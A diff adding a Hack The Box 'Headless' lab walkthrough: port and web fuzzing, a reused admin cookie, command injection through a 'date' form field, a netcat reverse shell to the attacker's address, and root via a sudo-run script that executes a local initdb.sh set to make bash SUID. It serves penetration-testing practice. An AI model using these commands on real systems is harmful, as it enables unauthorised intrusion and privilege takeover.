@@ -6,8 +6,8 @@ os: linux
 pwnDate: 2024-04-02
 releaseDate: 2024-03-23
 slug: "headless"
-isPublished: false
-shareLink: https://www.hackthebox.com/achievement/machine/
+isPublished: true
+shareLink: https://www.hackthebox.com/achievement/machine/701907/594
 ---
 
 import Browser from "@/components/Browser.astro" 
@@ -16,24 +16,162 @@ import Browser from "@/components/Browser.astro"
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.8 -oG allPorts
+
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
 ```
 
 ```bash
 sudo nmap -p22,80 -sCV 10.10.11.8 -oN targeted
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+5000/tcp open  upnp?
 ```
 
 ```bash
-sudo echo "10.10.11.8 headless.htb" >> /etc/hosts
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.8:5000/FUZZ -t 100 -mc all -fs 207
+
+dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6]
+support                 [Status: 200, Size: 2363, Words: 836, Lines: 93]
 ```
 
 ## Foothold
+
+```bash
+python -m http.server 80
+```
+
+<Browser
+  url="10.10.11.8:5000/support"
+  src="/walkthroughs/headless/0.png"
+/>
+
+```
+ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+```
+
+```bash
+curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" --data-binary "date=2023-09-15;ls" http://10.10.11.8:5000/dashboard | grep -A 10 "Systems are up and running"
+
+        Systems are up and running!
+app.py
+dashboard.html
+hackattempt.html
+hacking_reports
+index.html
+inspect_reports.py
+report.sh
+support.html
+```
+
+```bash
+nc -lvnp 5000
+```
+
+```bash
+curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" --data-binary "date=2023-09-15;nc+-c+bash+10.10.14.52+5000" http://10.10.11.8:5000/dashboard
+```
 
 ## Post Exploitation
 
 once inside we proceed to upgrade our shell following [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#script) guide. 
 
+```bash
+dvir@headless:~$ cat user.txt 
+29ed468da22ba93b04fa63ac4fbb4493
+```
+
 ## Lateral Movement
+
+```bash
+dvir@headless:~/app$ cat /var/mail/dvir 
+Subject: Important Update: New System Check Script
+
+Hello!
+
+We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.
+
+What's special for you?
+- You've been granted special privileges to use this script.
+- It will help identify and resolve system issues more efficiently.
+- It ensures that necessary updates are applied when needed.
+
+Rest assured, this script is at your disposal and won't affect your regular use of the system.
+
+If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.
+
+By the way, we're still waiting on you to create the database initialization script!
+Best regards,
+Headless
+```
+
+```bash
+dvir@headless:~$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+```
+
+```bash
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
 
 ## Privilege Escalation
 
-## Extra
+```bash
+dvir@headless:~/app$ echo "chmod u+s /bin/bash" > initdb.sh 
+dvir@headless:~/app$ chmod +x initdb.sh
+```
+
+```bash
+dvir@headless:~/app$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.7G
+System load average:  0.02, 0.02, 0.00
+Database service is not running. Starting it...
+```
+
+```bash
+dvir@headless:~/app$ bash -p
+```
+
+```bash
+bash-5.2# pwd
+/home/dvir/app
+bash-5.2# whoami
+root
+```
+
+```bash
+bash-5.2# cat /root/root.txt
+3cc7ca87466e1f3363ff9fe479375b95
+```
